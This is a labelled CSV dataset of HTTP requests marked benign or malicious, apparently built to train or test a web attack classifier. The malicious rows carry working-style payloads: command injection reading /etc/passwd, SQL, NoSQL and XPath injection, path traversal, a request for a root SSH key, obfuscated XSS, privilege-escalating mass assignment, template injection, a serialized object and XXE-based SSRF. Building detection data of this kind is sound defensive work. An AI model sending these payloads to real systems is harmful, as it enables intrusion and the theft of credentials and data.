label,text
malicious,"GET /api/v1/reports/generate HTTP/1.1
Host: analytics-data-hub.net
User-Agent: ReportGen/3.2 $(cat /etc/passwd)
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.9
Connection: keep-alive"
benign,"GET /apps/weather-widget/v2/widget.js HTTP/1.1
Host: api.cloud-data-services.ai
Connection: keep-alive
Accept: application/javascript, */*;q=0.1
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Referer: https://dashboard.api.cloud-data-services.ai/
User-Agent: Mozilla/5.0 (Linux; Android 12; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.110 Mobile Safari/537.36"
benign,"POST /v2/imports/order-history/data HTTP/1.1
Host: sales-tracker-suite.biz
Content-Type: text/csv
Content-Length: 115
User-Agent: curl/7.77.0
Accept: */*
Authorization: Token 7345abcd0987fghijklm
Cache-Control: no-cache

order_id,date,total
88231,2024-06-15,245.67
88232,2024-06-16,99.99"
benign,"GET /events/api/status HTTP/1.1
Host: realtime-sports-data.info
Accept: application/json
X-Requested-With: XMLHttpRequest
Connection: keep-alive
Cache-Control: no-cache
Pragma: no-cache
X-Forwarded-For: 172.31.255.254
User-Agent: python-requests/2.27.1"
benign,"GET /gallery/images?album=summer2024&format=thumbnail&callback=processData HTTP/1.1
Host: visual-arts-space.net
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:111.0) Gecko/20100101 Firefox/111.0
Accept: application/javascript, text/javascript, */*;q=0.1
Accept-Language: en-US,en;q=0.5
Cache-Control: no-cache
Connection: keep-alive
Referer: https://visual-arts-space.net/albums/2024/summer"
benign,"OPTIONS /api/v2/items HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:112.0) Gecko/20100101 Firefox/112.0
Accept: */*
Cache-Control: no-cache
DNT: 1
Connection: keep-alive"
benign,"GET /blog/post/read?id=847&title=Nature%27s+beauty+%26+serenity+in+photos HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
Accept: text/html
Cache-Control: no-cache
Pragma: no-cache
Connection: keep-alive"
malicious,"GET /api/v2/query/orders?id=123&filter_evil_chars=true&id=%27%20UNION%20SELECT%20credit_card%20FROM%20users-- HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Referer: https://dashboard.secure-user-portal.net/home
Cache-Control: no-cache
Accept-Language: en-US,en;q=0.9"
malicious,"POST /api/v3/query/user HTTP/1.1
Host: data-insights-platform.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
Content-Type: application/json
Accept: application/json
Accept-Language: en-US,en;q=0.9
Cache-Control: no-cache
Cookie: session_token=xyz987abc654

{""query"":{""$where"":""this.username=='admin' && this.password.startsWith('a') || sleep(5000)""}}"
benign,"HEAD /assets/tutorial_series/episode12_1080p.mp4 HTTP/1.1
Host: reliable-media-archive.info
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:111.0) Gecko/20100101 Firefox/111.0
Accept: video/mp4,video/*;q=0.8
Accept-Encoding: gzip, deflate
If-None-Match: ""2f5d8e3b82cf1f8ac4af""
Connection: keep-alive"
malicious,"POST /api/v1/profile/update HTTP/1.1
Host: appdata.enterprise-cloud.io
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: application/json, text/plain, */*
Origin: https://appdata.enterprise-cloud.io
Content-Length: 94
Connection: keep-alive

userid=guest&perm=read&userid=superuser&perm=write&note=normal+update&note=%3Cscript%3Exss()%3C%2Fscript%3E"
benign,"GET /blog/post/2023/06/future-of-ai HTTP/1.1
Host: community.tech-thoughts.org
Connection: keep-alive
Accept: text/html,application/xhtml+xml,application/xml;q=0.9
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.8
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.87 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Referer: https://www.google.com/"
malicious,"POST /api/v2/data/query HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.9
Content-Type: application/json
Content-Length: 126
Connection: keep-alive
Cookie: session_token=4f7a9d2e1c8b3a7f9d0e5b1a2c7d8e4f

{""query"": ""/users/user[username='admin' and substring(password,1,1)='p']/id""}"
malicious,"GET /load/file%3A%2F%2F%2Froot%2F.id_rsa HTTP/1.1
Host: api-secure-reports.enterprise-data.ai
User-Agent: Python-urllib/3.9
Accept: application/json
Referer: https://portal.enterprise-data.ai/login
Connection: keep-alive"
benign,"DELETE /api/v1/photos/3a5e4cbd HTTP/1.1
Host: creative-portfolio-site.org
Authorization: Bearer mktPLJ87SxuzHD039JjD
Accept: application/json
DNT: 1
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Connection: close"
benign,"POST /blog/post/comment HTTP/1.1
Host: my-personal-blog-site.info
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=abc123boundary
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1
Content-Length: 302
Accept-Language: en-US,en;q=0.9
Referer: https://my-personal-blog-site.info/blog/post/1054

--abc123boundary
Content-Disposition: form-data; name=""username""

lisa.morgan89
--abc123boundary
Content-Disposition: form-data; name=""email""

lisa.morgan89@mailservice.com
--abc123boundary
Content-Disposition: form-data; name=""comment""

Great insights! Looking forward to more posts about travel destinations.
--abc123boundary
Content-Disposition: form-data; name=""subscribe_newsletter""

true
--abc123boundary--"
benign,"GET /products;category=books/featured/2023 HTTP/1.1
Host: epic-reads-portal.com
Accept: text/html,application/xhtml+xml
Connection: keep-alive
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1
Accept-Language: en-US,en;q=0.8
Referer: https://epic-reads-portal.com/home
Upgrade-Insecure-Requests: 1"
benign,"GET /jobs/listings?skill=python&skill=docker&skill=aws&location=remote HTTP/1.1
Host: next-gen-tech-recruiters.ai
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (Linux; Android 13; SM-G996U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.198 Mobile Safari/537.36
Connection: keep-alive
Referer: https://next-gen-tech-recruiters.ai/dashboard
Accept-Encoding: gzip, deflate, br"
benign,"GET /dashboard/reports/active-users?period=monthly HTTP/1.1
Host: enterprise-analytics-suite.biz
Accept-Encoding: br, gzip, deflate
Accept: application/json, text/plain
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.44 Safari/537.36
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.fake.token
Connection: keep-alive"
benign,"DELETE /chatrooms/public/1952/messages/8837 HTTP/1.1
Host: community.game-dev-forum.org
Authorization: Bearer api_key_7364f9d8321f
X-Confirm-Delete: true
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/602.4.8 (KHTML, like Gecko) Version/14.0.3 Safari/602.4.8
Accept-Language: fr-FR,fr;q=0.8,en-US;q=0.5,en;q=0.3
Connection: close"
benign,"PUT /updates/profile/86 HTTP/1.1
Host: secure-membership-platform.cooptech.eu
Authorization: Bearer d29jdGZkanNmODU2YXZoYm5zZ2JhZWY4Y3Q4ZXZz
Origin: https://secure-membership-platform.cooptech.eu
X-Requested-With: XMLHttpRequest
Content-Type: application/json
Accept: application/json
User-Agent: Mozilla/5.0 (Windows NT 11.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0
Content-Length: 90

{""address"":{""street"":""123 Maple Ave"",""city"":""Portland"",""postalCode"":""97209""},""preferences"":{""contactMethod"":""email""}}"
benign,"GET /catalog/search?keywords=gourmet+tea&origin=china&flavor=jasmine&organic=true&price_range=10-50&package_sizes=100g,200g&sort=best_sellers&page=5&limit=40&include_reviews=true&language=en HTTP/1.1
Host: tea-discovery.co
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: keep-alive"
benign,"GET /api-docs/openapi.json HTTP/1.1
Host: fintech-api-platform.net
Accept: application/json
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1
Origin: https://fintech-api-platform.net
Connection: keep-alive"
benign,"GET /products/electronics/tv/details?id=3701 HTTP/1.1
Host: online-retail-store.biz
User-Agent: Dalvik/2.1.0 (Linux; U; Android 11; SM-G998U Build/RP1A.200720.012)
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
X-Requested-With: XMLHttpRequest
Connection: keep-alive"
benign,"OPTIONS /v4/reports/generate HTTP/1.1
Host: reports.enterprise-analytics.cloud
Origin: https://analytics-tools-suite.io
Access-Control-Request-Method: GET
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Accept: */*
Connection: keep-alive"
malicious,"PATCH /api/settings/update HTTP/1.1
Host: secure-document-management.io
Content-Type: application/json
Content-Length: 308
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1
Origin: https://secure-document-management.io
X-Requested-With: FetchAPIClient
Accept: application/json, text/html
Accept-Language: en-US,en;q=0.5

{""profile"": {""visibility"": ""private"", ""emailAlerts"": false}, ""<img src=x onerror=\""eval(String.fromCharCode(0x61,108,0145,114,0x74,40,0x27,88,0x53,0123,45,0x4b,101,0x79,0x27,41))\"">"": ""xss_trigger"", ""lastPasswordChange"": ""2024-04-20T07:15:00Z""}"
malicious,"GET /content/load?file=../../../../../../../../etc/passwd HTTP/1.1
Host: enterprise-analytics-suite.co
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Accept: */*
Accept-Encoding: gzip, deflate
Cache-Control: max-age=0
Connection: keep-alive"
benign,"POST /chat/send-message HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: curl/7.88.1
Content-Type: application/x-www-form-urlencoded
Accept: */*
Content-Length: 33
Connection: close

message=run_launch_sequence&thread=489"
benign,"POST /profile/update HTTP/1.1
Host: my-personal-blog-site.info
Content-Type: application/x-www-form-urlencoded
Content-Length: 94
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1
Accept-Language: en-us
Referer: https://my-personal-blog-site.info/account/settings
Connection: keep-alive

display_name=Sam+O%27Neill%25&about=Author+and+blogger+%23Tech%26Travel+enthusiast.+Coffee%23Addict."
benign,"GET /assets/styles/theme.min.css HTTP/1.1
Host: online-retail-empire.biz
Connection: keep-alive
Accept: text/css,*/*;q=0.1
Referer: https://online-retail-empire.biz/products/electronics
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15
Accept-Encoding: br, gzip, deflate
Accept-Language: en-GB,en;q=0.8"
benign,"POST /photos/multi-upload HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
Accept: image/webp,image/apng,image/*,*/*;q=0.8
Accept-Encoding: gzip, deflate
Connection: keep-alive
Content-Type: multipart/form-data; boundary=----BoundaryXYZ1234
Content-Length: 987

------BoundaryXYZ1234
Content-Disposition: form-data; name=""upload[]""; filename=""concept_art1.jpeg""
Content-Type: image/jpeg

<JPEG FILE DATA - omitted>
------BoundaryXYZ1234
Content-Disposition: form-data; name=""upload[]""; filename=""concept_art2.png""
Content-Type: image/png

<PNG FILE DATA - omitted>
------BoundaryXYZ1234--"
malicious,"POST /services/configure HTTP/1.1
Host: object-bridge.net
Content-Type: text/xml; charset=utf-8
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36
SOAPAction: ""http://object-bridge.net/configure""

<?xml version=""1.0"" encoding=""UTF-8""?>
<data>
  <serializedObject><![CDATA[AAEAAAD/////AQAAABZTeXN0ZW0uQ29uZmlndXJhdGlvbi5JbnN0YWxsLkFzc2VtYmx5SW5zdGFsbGVyAQAAAAdTeXN0ZW0uV2luZG93cy5EYXRhLk9iamVjdERhdGFQcm92aWRlcgIAAAADU3RhcnQAAAGUAAAATWV0aG9kQ3Vyc3NvclBhcnRhIjo7aGlkZGVuADw+]]></serializedObject>
</data>"
benign,"GET /images/logo.svg HTTP/1.1
Host: cloud-photo-storage.net
Accept: image/svg+xml,image/*;q=0.9,*/*;q=0.7
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15
Accept-Encoding: gzip, deflate, br
Cache-Control: max-age=86400
Connection: keep-alive"
benign,"GET /openapi/swagger.json HTTP/1.1
Host: secure-docs-platform.org
Accept: application/json
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
DNT: 1"
malicious,"POST /api/v3/searchItems HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
Accept: application/xml, */*
Content-Type: application/xml
Content-Length: 130
Referer: https://developer.cloud-data-services.ai/docs

<searchRequest>
  <term>' or count(//*) > 0 or ''='</term>
  <category>all</category>
</searchRequest>"
benign,"GET /home HTTP/1.1
Host: discover-techhub.ai
Connection: keep-alive
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Referer: https://discover-techhub.ai/
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
benign,"GET /products;category=books/search HTTP/1.1
Host: novelarchivist.ai
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
Accept: */*
Accept-Encoding: gzip
DNT: 1
Connection: close"
benign,"POST /api/v1/feedback HTTP/1.1
Host: uservoice-feedback-service.co
Authorization: Bearer wxkJ9384fjLSK03skhs831kd
Content-Type: application/json
Accept: application/json
Content-Language: en-US
User-Agent: Bingbot/2.0 (+http://www.bing.com/bingbot.htm)
Content-Length: 87

{""userId"":""abc123xyz"",""rating"":5,""comments"":""The recent update greatly improved load times, thanks!""}"
benign,"GET /api/status HTTP/1.1
Host: iot-device-cloud-services.tech
User-Agent: Datadog-HTTPCheck/1.0
Accept: application/json
Connection: keep-alive"
benign,"POST /api/support/ticket/create HTTP/1.1
Host: helpdesk.customer-care24.biz
Content-Type: application/json
X-Requested-With: XMLHttpRequest
Accept: application/json, text/plain
User-Agent: python-requests/2.31.0
Connection: keep-alive
Content-Length: 123

{""userId"":5421,""subject"":""Account access issue"",""description"":""Cannot log in despite reset password attempts. Tried clearing cookies and cache."",""priority"":""medium""}"
malicious,"POST /user/settings/update HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36""><svg/onload=eval(atob('YWxlcnQoJ1NldHRpbmcgQXR0YWNrJyk='))>
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/x-www-form-urlencoded
Content-Length: 28
Origin: https://online-retail-store.biz
Referer: https://online-retail-store.biz/user/settings
Connection: keep-alive

email=jane.doe%40mailservice.com"
benign,"GET /search?q=weather+forecast&location=Seattle HTTP/1.1
Host: live-weather-updates.tech
Accept: text/html,application/xhtml+xml,application/xml;q=0.9
X-Forwarded-For: 10.0.2.15
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.49 Safari/537.36
Referer: https://live-weather-updates.tech/home
Connection: keep-alive
Accept-Encoding: gzip, deflate
Cache-Control: no-cache"
malicious,"GET /search?query=%7B%7B+7*%277%27+%7D%7D HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate
Referer: https://online-retail-store.biz/home
Connection: keep-alive"
benign,"GET /fonts/lato-regular.ttf HTTP/1.1
Host: commerce-site-marketing.org
Accept: application/font-ttf,application/x-font-ttf,*/*;q=0.8
Referer: https://commerce-site-marketing.org/assets/css/mainfonts.css
Origin: https://commerce-site-marketing.org
Connection: keep-alive
User-Agent: curl/7.88.1
Accept-Encoding: identity
Accept-Language: en-US,en;q=0.8"
malicious,"PUT /accounts/settings HTTP/1.1
Host: secure-user-portal.net
Content-Type: text/plain
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Accept: text/html,application/xhtml+xml,application/xml;q=0.9
Referer: https://secure-user-portal.net/accounts
Content-Length: 87

user%5Bemail%5D=julia%40secure-user-portal.net&user%5Bsuperuser%5D=1&user%5Bprofile%5D%5Bverified%5D=true&user%5Broles%5D%5B%5D=8"
benign,"POST /account/settings HTTP/1.1
Host: secure-user-portal.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 105
Referer: https://secure-user-portal.net/account/settings
Cookie: session_token=7cfd982ab3e54678b2301fb28cdaa2f4
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_5_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15
Accept-Language: en-US,en;q=0.9
Connection: close

display_name=Maxwell+Turner&bio=Passionate+about+open-source+software.&website_url=https%3A%2F%2Fmaxwellturner.dev&location=Berlin%2C+Germany"
benign,"GET /api/v3/items/search?query=wireless+headphones&id=1024&limit=25 HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: curl/7.79.1
Accept: application/json
Connection: close"
malicious,"POST /api/v2/submit-comment HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept: application/xml, text/xml
Content-Type: application/xml
Content-Length: 209
Origin: https://online-retail-store.biz
Connection: keep-alive

<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE comment [
<!ENTITY xxe_ssrf SYSTEM ""http://172.16.0.3:8081/admin"" >
]>
<comment>
  <text>&xxe_ssrf;</text>
</comment>"
